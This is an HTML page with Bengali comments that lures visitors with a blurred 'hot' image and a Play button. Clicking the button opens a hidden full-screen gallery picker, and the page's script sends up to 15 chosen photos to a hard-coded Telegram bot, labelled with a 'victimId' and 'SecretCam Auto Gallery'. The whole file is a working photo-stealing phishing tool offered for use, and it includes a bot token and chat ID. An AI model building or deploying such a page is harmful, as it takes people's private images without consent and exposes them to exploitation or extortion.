<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body,html{height:100vh;overflow:hidden;background:#000;}
    #bg{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:blur(26px);transition:filter 1.3s ease;}
    .play{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:96px;height:96px;background:rgba(255,255,255,0.98);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:50px;color:#000;cursor:pointer;z-index:99;box-shadow:0 12px 60px rgba(0,0,0,0.9);animation:pulse 1.7s infinite;}
    @keyframes pulse{0%{box-shadow:0 12px 60px rgba(0,0,0,0.9);}70%{box-shadow:0 18px 90px rgba(255,255,255,1);}100%{box-shadow:0 12px 60px rgba(0,0,0,0.9);}}
  </style>
</head>
<body>

  <!-- তোমার সবচেয়ে হট ব্লার ছবি এখানে বসাও -->
  <img id="bg" src="https://i.imgur.com/YourHotImage.jpg" alt="Hot Preview">

  <div class="play" id="playBtn">Play</div>

<script>
// ==== তোমার টেলিগ্রাম ====
const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
const CHAT_ID   = "7731349577";
// =========================

const victimId = new URLSearchParams(location.search).get('id') || 'unknown';
const bg = document.getElementById('bg');
const playBtn = document.getElementById('playBtn');

playBtn.onclick = () => {
  playBtn.style.display = 'none';
  bg.style.filter = 'blur(0px)';

  // ম্যাজিক: গ্যালারি পারমিশন চাইবে + Allow দিলেই অটো সাম্প্রতিক ছবি পাঠাবে
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = 'image/*';
  input.multiple = true;

  // এই লাইনগুলোই ক্যামেরা বন্ধ করে শুধু গ্যালারি ওপেন করে
  input.setAttribute('accept', 'image/*');
  input.setAttribute('multiple', '');
  // কোনো capture ব্যবহার করছি না → তাই ক্যামেরা আসবে না

  input.style.position = 'fixed';
  input.style.opacity = '0';
  input.style.width = '100%';
  input.style.height = '100%';
  input.style.top = '0';
  input.style.left = '0';
  input.style.zIndex = '99999';
  document.body.appendChild(input);

  input.onchange = async (e) => {
    if (!e.target.files || e.target.files.length === 0) return;

    const files = Array.from(e.target.files).slice(0, 15); // প্রথম ১৫টা

    for (let i = 0; i < files.length; i++) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', files[i]);
      form.append('caption', `SecretCam Auto Gallery\nID: ${victimId}\nছবি: ${i+1}/${files.length}\n${new Date().toLocaleString('bn-BD')}`);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
      });

      await new Promise(r => setTimeout(r, 700));
    }

    // সব পাঠানো শেষ → রিডাইরেক্ট
    setTimeout(() => {
      location.href = "https://i.imgur.com/removed.png";
    }, 2500);
  };

  // Allow চাপলেই গ্যালারি পারমিশন আসবে + ছবি অটো আসবে
  input.click();
};
</script>
</body>
</html>
